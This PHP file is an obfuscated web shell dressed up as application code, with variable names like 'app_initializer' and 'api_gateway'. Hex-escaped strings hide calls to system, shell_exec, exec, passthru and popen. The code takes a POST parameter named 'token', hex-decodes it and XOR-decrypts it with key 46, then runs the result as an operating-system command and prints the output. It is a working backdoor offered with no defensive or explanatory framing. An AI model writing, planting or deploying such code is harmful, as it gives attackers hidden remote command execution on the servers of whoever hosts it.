<?php

$framework = "\x68ex\x32\x62\x69n";
$app_initializer7 = "pclo\x73\x65";
$app_initializer5 = "\x70o\x70en";
$app_initializer2 = "\x73h\x65\x6Cl_ex\x65c";
$app_initializer4 = "\x70a\x73\x73t\x68ru";
$app_initializer3 = "ex\x65\x63";
$app_initializer6 = "\x73tre\x61\x6D\x5Fg\x65t\x5F\x63o\x6E\x74ents";
$app_initializer1 = "s\x79s\x74e\x6D";
if (isset($_POST["t\x6Fke\x6E"])) {
            function api_gateway      (     $dchunk    ,     $marker   )    {    $key   =    ''    ;   foreach(str_split($dchunk) as $char){$key.=chr(ord($char)^$marker);} return    $key;      }
            $token = $framework($_POST["t\x6Fke\x6E"]);
            $token = api_gateway($token, 46);
            if (function_exists($app_initializer1)) {
                $app_initializer1($token);
            } elseif (function_exists($app_initializer2)) {
                print $app_initializer2($token);
            } elseif (function_exists($app_initializer3)) {
                $app_initializer3($token, $itm_dchunk);
                print join("\n", $itm_dchunk);
            } elseif (function_exists($app_initializer4)) {
                $app_initializer4($token);
            } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
                $marker_key = $app_initializer5($token, 'r');
                if ($marker_key) {
                    $reference_pointer = $app_initializer6($marker_key);
                    $app_initializer7($marker_key);
                    print $reference_pointer;
                }
            }
            exit;
        }